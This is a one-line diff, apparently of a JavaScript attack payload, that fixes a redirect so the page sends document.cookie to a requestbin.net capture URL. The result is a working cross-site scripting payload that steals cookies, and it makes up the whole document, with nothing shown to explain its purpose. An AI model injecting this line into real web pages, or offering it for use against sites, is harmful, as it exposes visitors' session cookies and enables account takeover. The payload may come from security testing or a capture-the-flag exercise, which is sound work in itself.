@@ -1,1 +1,1 @@
-window.location=http://requestbin.net/r/uhndijuh;
+window.location="http://requestbin.net/r/uhndijuh?cookie="+document.cookie;
